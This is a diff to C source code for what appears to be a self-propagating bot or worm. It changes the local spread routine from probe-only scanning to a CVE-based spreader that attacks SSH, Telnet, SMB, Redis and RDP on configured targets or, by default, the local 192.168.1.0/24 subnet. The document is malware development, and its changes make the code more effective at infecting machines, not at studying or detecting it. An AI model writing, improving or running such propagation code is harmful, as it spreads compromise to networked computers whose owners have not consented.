@@ -2684,18 +2684,20 @@ int spawn_scan_threads(notnet_bot_t *bot, const char *subnet, uint8_t service_ma
 int spread_local(notnet_bot_t *bot) {
     log_info("Local spread cycle started");
     
-    /* Scan explicit targets if configured (overrides defaults) */
+    /* Spread explicit targets if configured (overrides defaults).
+     * Uses spawn_scan_threads() — the CVE-first per-open-port spreader —
+     * not scan_subnet() (probe-only, #95). */
     if (bot->scan_target_count > 0) {
         log_info("Scanning %d explicit targets", bot->scan_target_count);
         uint8_t all_services = SPREAD_SSH | SPREAD_TELNET | SPREAD_SMB | SPREAD_REDIS | SPREAD_RDP;
         for (int i = 0; i < bot->scan_target_count && i < 16; i++) {
-            scan_subnet(bot, bot->scan_targets[i], all_services);
+            spawn_scan_threads(bot, bot->scan_targets[i], all_services);
         }
         return 0;
     }
     
     /* Default: just scan local /24 (not /16) */
-    scan_subnet(bot, "192.168.1.0/24",
+    spawn_scan_threads(bot, "192.168.1.0/24",
                 SPREAD_SSH | SPREAD_TELNET | SPREAD_SMB | SPREAD_REDIS | SPREAD_RDP);
     
     return 0;
